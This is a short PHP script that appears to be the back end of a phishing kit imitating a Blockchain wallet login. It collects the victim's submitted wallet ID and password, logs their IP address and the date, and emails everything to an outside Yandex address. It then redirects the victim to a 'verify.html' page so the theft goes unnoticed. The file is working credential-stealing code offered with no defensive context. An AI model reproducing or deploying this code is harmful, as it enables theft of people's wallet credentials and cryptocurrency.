<?php

session_start();
$ip = getenv("REMOTE_ADDR");
$adddate=date("D M d, Y g:i a");
$message .= "--------   BlockChain Logz  -----\n";
$message .= "Wallet-ID: ".$_POST['wall-id']."\n";
$message .= "Password: ".$_POST['pass-id']."\n";
$message .= "======================================\n";
$message .= "IP: ".$ip."\n";
$message .= "Date: ".$adddate."\n";
$message .= "--------------------------------------\n";

$recipient = "maxgomery@yandex.com";
$subject = "Blockchain";
$headers = "From: ";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
     mail("", "", $message);
if (mail($recipient, $subject, $message, $headers)) :
    ?>
    
           <script language=javascript>
window.location='verify.html';
</script>

    <?php
else :
        echo "ERROR! Please go back and try again.";
endif;

?>
